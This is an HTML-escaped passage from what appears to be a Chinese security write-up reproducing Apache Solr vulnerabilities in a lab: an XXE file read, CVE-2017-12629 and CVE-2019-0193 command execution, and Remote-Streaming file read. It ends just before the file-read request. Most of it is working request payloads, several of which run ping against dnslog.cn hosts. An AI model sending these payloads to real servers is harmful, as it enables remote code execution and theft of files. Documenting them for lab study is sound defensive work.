 &lt;code&gt;http://192.168.77.128:8983/solr/demo/select?&amp;amp;q=&amp;lt;?xml+version=&amp;quot;1.0&amp;quot;+?&amp;gt;&amp;lt;!DOCTYPE+root[&amp;lt;!ENTITY+%+ext+SYSTEM+&amp;quot;http://192.168.77.128/1.dtd&amp;quot;&amp;gt;%ext;%ent;]&amp;gt;&amp;lt;r&amp;gt;&amp;amp;data;&amp;lt;/r&amp;gt;&amp;amp;wt=xml&amp;amp;defType=xmlparser&lt;/code&gt; &lt;br&gt;
 执行 payload，获取文件信息成功&lt;br&gt;
&lt;img src=&#34;../_resources/7053300facb7c69236631c1d082a1013.png&#34; alt=&#34;7053300facb7c69236631c1d082a1013.png&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;本地dtd读取文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#本地dtd读取文件&#34;&gt;#&lt;/a&gt; 本地 DTD 读取文件&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/83713259&#34;&gt;XXE 之利用本地 DTD 进行文件读取&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;cve-2017-12629-rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2017-12629-rce&#34;&gt;#&lt;/a&gt; CVE-2017-12629-RCE&lt;/h1&gt;
&lt;h2 id=&#34;影响版本-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本-2&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
&lt;p&gt;Apache Solr &amp;lt; 7.1&lt;br&gt;
Apache Lucene &amp;lt; 7.1&lt;/p&gt;
&lt;h2 id=&#34;复现过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程-2&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
&lt;p&gt;触发命令执行的事件有两种：postCommit 和 newSearcher&lt;/p&gt;
&lt;h3 id=&#34;使用newsearcher&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用newsearcher&#34;&gt;#&lt;/a&gt; 使用 newSearcher&lt;/h3&gt;
&lt;p&gt;其中 demo 为存在的 core 名称&lt;br&gt;
数据包：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.77.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;add-listener&amp;quot; : &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;event&amp;quot;:&amp;quot;newSearcher&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;name&amp;quot;:&amp;quot;newlistener1&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;class&amp;quot;:&amp;quot;solr.RunExecutableListener&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;exe&amp;quot;:&amp;quot;ping&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;dir&amp;quot;:&amp;quot;/usr/bin/&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;args&amp;quot;:[&amp;quot;3pqsrm.dnslog.cn&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;../_resources/94b6a5f1b4ac9063e66287dcb8c4a904.png&#34; alt=&#34;94b6a5f1b4ac9063e66287dcb8c4a904.png&#34;&gt;&lt;br&gt;
&lt;img src=&#34;../_resources/1ad6af042c22a35b1a3f512ecdded65b.png&#34; alt=&#34;1ad6af042c22a35b1a3f512ecdded65b.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;使用postcommit&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用postcommit&#34;&gt;#&lt;/a&gt; 使用 postCommit&lt;/h3&gt;
&lt;p&gt;数据包 1：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.77.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;add-listener&amp;quot; : &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;event&amp;quot;:&amp;quot;postCommit&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;name&amp;quot;:&amp;quot;newlistener3&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;class&amp;quot;:&amp;quot;solr.RunExecutableListener&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;exe&amp;quot;:&amp;quot;ping&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;dir&amp;quot;:&amp;quot;/usr/bin/&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;args&amp;quot;:[&amp;quot;3pqsrm.dnslog.cn&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发送该请求后一直没有返回数据，取消重发会回显该 name 已经存在，所以发送第二个数据包&lt;br&gt;
&lt;img src=&#34;../_resources/2127408f02166332e7024113d04771c7.png&#34; alt=&#34;2127408f02166332e7024113d04771c7.png&#34;&gt;&lt;br&gt;
 数据包 2 (数据随便输)：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/update HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.77.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&amp;#123;&amp;quot;id&amp;quot;:&amp;quot;test&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;../_resources/fd55bbc422425d1cc140a4b9c47bb275.png&#34; alt=&#34;fd55bbc422425d1cc140a4b9c47bb275.png&#34;&gt;&lt;br&gt;
 更新后发现两条记录都在（之前因为没有返回数据又试了一次）&lt;br&gt;
&lt;img src=&#34;../_resources/87bd83e9378424bd1f9371d9d213a4c8.png&#34; alt=&#34;87bd83e9378424bd1f9371d9d213a4c8.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;cve-2019-0193&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2019-0193&#34;&gt;#&lt;/a&gt; CVE-2019-0193&lt;/h1&gt;
&lt;h2 id=&#34;影响版本-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本-3&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
&lt;p&gt;Apache solr &amp;lt; 8.2.0&lt;/p&gt;
&lt;h2 id=&#34;复现过程-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程-3&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
&lt;p&gt;在 Apache solr 的可选模块 DatalmportHandler 中的 DIH 配置是可以包含脚本，因此存在安全隐患，在 apache solr &amp;lt; 8.2.0 版本之前 DIH 配置中 dataconfig 可以被用户控制&lt;/p&gt;
&lt;p&gt;vulhub 环境下，进入后会让我们新建一个 core&lt;br&gt;
&lt;img src=&#34;../_resources/ddc393bc282026e3dab3eda7d12be543.png&#34; alt=&#34;ddc393bc282026e3dab3eda7d12be543.png&#34;&gt;&lt;br&gt;
 我们需要在服务器中新建，这里新建会报错找不到配置文件&lt;br&gt;
新建 test core 命令&lt;br&gt;
 &lt;code&gt;docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db &lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;../_resources/4408b56e4ba62cde34034ac2e758e594.png&#34; alt=&#34;4408b56e4ba62cde34034ac2e758e594.png&#34;&gt;&lt;br&gt;
 刷新页面即可看见新建的 core&lt;br&gt;
 根据以下步骤进行代码执行&lt;br&gt;
&lt;img src=&#34;../_resources/f3b7b2eac45cbc2012a1e0645496bc1f.png&#34; alt=&#34;f3b7b2eac45cbc2012a1e0645496bc1f.png&#34;&gt;&lt;br&gt;
exp：&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dataConfig&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dataSource&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;URLDataSource&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;handlebars&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;handlebars&#34;&gt;          function poc()&amp;#123; java.lang.Runtime.getRuntime().exec(&amp;quot;ping 0ytihf.dnslog.cn&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;handlebars&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;handlebars&#34;&gt;  ]]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;document&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;entity&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;stackoverflow&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;url&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;https://stackoverflow.com/feeds/tag/solr&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;processor&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;XPathEntityProcessor&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;forEach&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;/feed&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;transformer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;script:poc&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;document&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dataConfig&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行成功后，上方会出现绿色修勾勾&lt;br&gt;
&lt;img src=&#34;../_resources/63a1299f3a6105014fe6ca0d077857d7.png&#34; alt=&#34;63a1299f3a6105014fe6ca0d077857d7.png&#34;&gt;&lt;br&gt;
 命令执行成功&lt;br&gt;
&lt;img src=&#34;../_resources/c7aa99cb57448a243367095f5b1cd1af.png&#34; alt=&#34;c7aa99cb57448a243367095f5b1cd1af.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;remote-streaming-fileread任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#remote-streaming-fileread任意文件读取&#34;&gt;#&lt;/a&gt; Remote-Streaming-Fileread（任意文件读取）&lt;/h1&gt;
&lt;h2 id=&#34;复现过程-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程-4&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;获取 cores&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /solr/admin/cores?_=1637649371526&amp;amp;show=schema&amp;amp;wt=json HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;存在的 core 名为 demo&lt;br&gt;
&lt;img src=&#34;../_resources/b07e466a79ac15b0597a2354b9a7f378.png&#34; alt=&#34;b07e466a79ac15b0597a2354b9a7f378.png&#34;&gt;&lt;br&gt;
2. 修改 demo 的配置，开启 RemoteStreaming&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config?_=1637649371526&amp;amp;show=schema&amp;amp;wt=json HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;set-property&amp;quot; : &amp;#123;&amp;quot;requestDispatcher.requestParsers.enableRemoteStreaming&amp;quot;:true&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当出现以下信息时，表示漏洞可能存在:&lt;br&gt;
This response format is experimental.  It is likely to change in the future&lt;br&gt;
&lt;img src=&#34;../_resources/240c340be0b4a48321e3bfa01a8bdebd.png&#34; alt=&#34;240c340be0b4a48321e3bfa01a8bdebd.png&#34;&gt;&lt;br&gt;
3. 读取敏感文件&lt;br&gt;
数据包：&lt;/p&gt;
